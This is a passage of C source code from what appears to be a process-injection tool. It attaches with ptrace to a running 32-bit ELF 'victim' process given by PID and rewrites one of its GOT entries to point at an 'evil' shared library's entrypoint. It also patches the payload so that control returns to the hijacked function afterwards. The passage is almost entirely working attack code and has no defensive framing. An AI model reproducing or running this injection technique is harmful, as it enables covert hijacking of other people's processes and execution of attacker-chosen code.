             * replaced with checking if @evillib_symtab_address == @evillib_strtab_address
             * nearly all the Elfs i've worked with have the dynamic string table
             * alongside the dynamic symbol table with start_dyn_string_tab == end_dyn_symbol_table
             */
            break;
        }

        evillib_symtab_address = (long *)(++tmp_symtab_ptr);
    }
    
    //GOT[] = 
    victim_process.mem.victim_got_entry_orig_content =
        (Elf32_Addr)ptrace(PTRACE_PEEKTEXT,
                           victim_process.pid,
                           victim_process.mem.victim_got_entry_address,
                           0x0);

    if (ptrace(PTRACE_POKETEXT,
               victim_process.pid,
               victim_process.mem.victim_got_entry_address,
               victim_process.evil_lib.entrypoint) < 0x0)
        __error(perror, "error @ line [694]");

    /*
     * patching the evil payload to transfer execution back to the hijacked function
     */
    char *evillib_entrypoint_address = (char *)victim_process.evil_lib.entrypoint;
    for (unsigned long data = 0; data != 0xcafebabe; )
    {
        data = ptrace(PTRACE_PEEKTEXT,
                      victim_process.pid,
                      evillib_entrypoint_address++,
                      0x0);
    }

    /*
     * 0x7 
     * - 2 for jmp *eax 
     * - 5 for movl $0xaabbccdd, %eax 
     */
    evillib_entrypoint_address -= 0x7;

    if (ptrace(PTRACE_POKETEXT,
               victim_process.pid,
               evillib_entrypoint_address,
               victim_process.mem.victim_got_entry_orig_content) < 0)
        __error(perror, "error @ line [720]");

    printf("[done]\n");

    return FUNC_SUCCESS;
    
}

int main(int argc, char **argv)
{
    assert(argc == 4);
	
    victim_process.victim_symbol_name = argv[2];
    victim_process.evil_lib.path = argv[3];
    
    victim_process.pid = (pid_t)atol(argv[1]);
    if (victim_process.pid == 0) 
    {
        printf("no process exist with provided id\n");
        return EXIT_FAILURE;
    }

    if (!(evil_lib_get_info()       && 
          process_attach()          &&
          locate_victim_got_entry() &&
          inject_evil_sharedlib()   &&
          process_detach()))
        return EXIT_FAILURE;

    return EXIT_SUCCESS;
}




